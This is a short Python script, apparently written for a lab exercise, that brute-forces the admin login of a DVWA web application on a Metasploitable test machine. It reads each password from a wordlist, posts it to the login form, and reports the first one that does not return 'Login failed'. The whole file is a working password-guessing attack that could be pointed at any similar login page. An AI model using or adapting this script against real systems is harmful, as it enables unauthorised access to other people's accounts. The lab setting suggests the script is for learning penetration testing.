#!/usr/bin/env python

### AGAINST METASPLOITABLE ###

import requests

# Target url is the URL in the action field of the form tag
target_url = "http://10.0.2.11/dvwa/login.php"

# The first field is the name of the field in the input tag
data_dict = {"username": "admin", "password": "", "Login":"submit"}
response = requests.post(target_url, data=data_dict)

password_file = "test_passwords.txt"
with open(password_file, mode='r') as wordlist_file:
    for line in wordlist_file:
        # Removing any white space characters
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password --> " + word)
            exit()
                
print("[+] Reached end of line.")